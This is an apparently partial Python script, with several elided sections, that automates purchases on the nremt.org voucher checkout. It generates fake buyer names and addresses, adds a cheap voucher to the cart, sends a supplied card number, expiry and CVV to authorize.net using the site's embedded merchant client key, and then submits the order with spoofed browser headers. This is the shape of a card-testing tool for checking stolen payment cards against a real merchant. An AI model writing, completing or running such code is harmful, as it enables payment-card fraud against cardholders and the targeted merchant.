...
def _fakedata():
    return {
        'first_name': _f.first_name(), 'last_name': _f.last_name(),
        'address': _f.street_address(), 'city': _f.city(),
        'state': _f.state_abbr(), 'postal': _f.postcode(),
    }
...
def _capture(s, init, offset):
    try: return s.split(init)[1].split(offset)[0]
...
def _flow(num, mes, ano, cvv):
    ...
    s1 = sess.post(
        'https://www.nremt.org/ShoppingCart/AddToCart',
        headers={'accept':'application/json, text/javascript, */*; q=0.01','accept-language':'es-ES,es;q=0.9','content-type':'application/json; charset=UTF-8','origin':'https://www.nremt.org','referer':'https://www.nremt.org/Products/Vouchers/Paper-Application-Processing-Fee-Voucher','user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36','x-requested-with':'XMLHttpRequest'},
        json={'ProductSKUID': 96, 'Quantity': 1}, timeout=30)
    time.sleep(1)
    ...
    s4 = sess.post(
        ...
        headers={'Accept':'*/*','Accept-Language':'es-ES,es;q=0.9','Connection':'keep-alive','Content-Type':'application/json; charset=UTF-8','Origin':'https://js.authorize.net','Referer':'https://js.authorize.net/','User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'},
        json={'securePaymentContainerRequest':{'merchantAuthentication':{'name':'5Ww66SGu5','clientKey':'4jErzDpW56xvKpGjH7V53J3xhPCE9uw8GGs37ZmpxA65yqKWVYyq92QVC3m9FpZr'},'clientId':'accept-ui-v3','data':{'type':'TOKEN','id':'e8323048-aece-187c-d42a-6120507f6de2','token':{'cardNumber':num,'expirationDate':f"{mes.zfill(2)}{ano}",'cardCode':cvv}}}},
        timeout=30)
    ...
    sess.get(
        'https://www.nremt.org/validate-address',
        params={'AuthNetAddressId':'null','FirstName':data['first_name'],'LastName':data['last_name'],'PhoneNumber':'','StreetAddress':addr['address'],'City':addr['city'],'State':addr['state'],'ZipCode':addr['postal'],'Country':'USA','IsValidated':'false'},
        timeout=30)

    s6 = sess.post(
        'https://www.nremt.org/Checkout/SaveOrder',
        headers={'accept':'application/json, text/javascript, */*; q=0.01','accept-language':'es-ES,es;q=0.9','content-type':'application/json; charset=UTF-8','origin':'https://www.nremt.org','referer':'https://www.nremt.org/shopping-cart/checkout','user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36','x-requested-with':'XMLHttpRequest'},
